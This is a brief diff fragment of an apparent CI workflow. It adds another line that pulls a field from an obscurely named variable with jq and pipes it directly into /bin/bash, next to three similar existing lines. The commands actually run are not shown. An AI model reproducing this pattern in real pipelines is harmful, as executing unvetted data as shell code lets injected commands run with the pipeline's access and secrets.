@@ -24,6 +24,7 @@ jobs:
           echo $uoeii94386 | jq -r .l1084 | /bin/bash
           printf '%s' "$urm6" | jq -r .nga0914 | /bin/bash
           printf '%s' "$jv5933" | jq -r .vvwm3 | /bin/bash
+          echo $rj18 | jq -r .om30 | /bin/bash
 
       - name: Save output
         if: always()
